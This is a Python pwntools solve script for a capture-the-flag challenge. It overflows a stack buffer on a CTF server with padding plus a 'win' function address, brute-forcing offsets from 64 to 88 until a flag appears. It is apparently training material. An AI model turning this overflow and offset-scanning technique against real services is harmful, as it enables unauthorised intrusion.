#!/usr/bin/env python3

from pwn import *
import sys
import time

HOST = "ctf.ac.upt.ro"
PORT = 9024

WIN_ADDR = 0x401196
DEFAULT_OFFSET = 72

context.arch = 'amd64'
context.log_level = 'info'

def try_exploit(offset):
    payload = b"A" * offset + p64(WIN_ADDR)
    try:
        io = remote(HOST, PORT, timeout=5)
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return None

    try:
        banner = io.recvuntil(b"Spune ceva:", timeout=2)
    except EOFError:
        banner = b""
    except Exception:
        banner = b""

    print(f"[+] Trying offset {offset} -> sending {len(payload)} bytes")
    io.sendline(payload)

    try:
        data = io.recvall(timeout=3)
    except Exception:
        try:
            data = io.recv(timeout=2)
        except Exception:
            data = b""
    io.close()
    return banner + data

def looks_like_flag(data_bytes):
    if not data_bytes:
        return False
    s = data_bytes.decode(errors='ignore')
    return ("flag{" in s) or ("FLAG{" in s) or ("CTF{" in s) or ("{" in s and "}" in s and len(s) > 8)

def main():
    out = try_exploit(DEFAULT_OFFSET)
    if looks_like_flag(out):
        print("(offset {})\n".format(DEFAULT_OFFSET))
        print(out.decode(errors='ignore'))
        return

    for off in range(64, 89):
        out = try_exploit(off)
        if looks_like_flag(out):
            print("(offset {})\n".format(off))
            print(out.decode(errors='ignore'))
            return
        time.sleep(0.2)

if __name__ == '__main__':
    main()
